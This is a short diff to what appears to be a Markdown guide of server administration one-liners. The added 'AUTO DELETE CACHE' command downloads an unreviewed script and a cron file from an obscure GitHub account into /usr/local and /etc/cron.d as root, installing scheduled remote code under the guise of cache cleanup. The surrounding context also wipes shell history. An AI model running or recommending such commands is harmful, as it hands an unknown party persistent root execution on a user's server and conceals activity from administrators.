@@ -45,9 +45,9 @@ HISTSIZE=0 && exit
 ```
 rm -f $HISTFILE && unset HISTFILE && exit
 ```
-# DELETE CACHE
+# AUTO DELETE CACHE
 ```
-sh -c 'echo 1 >  /proc/sys/vm/drop_caches'
+cd /usr/local/ && mkdir auto && cd auto && curl -OL https://raw.githubusercontent.com/235nvnybtq235/script/main/shareport/cron.sh && chmod +x cron.sh && cd /etc/cron.d && curl -OL https://raw.githubusercontent.com/235nvnybtq235/script/main/shareport/cron && cd /root
 ```
 # ANTI DDOS L4
 ```
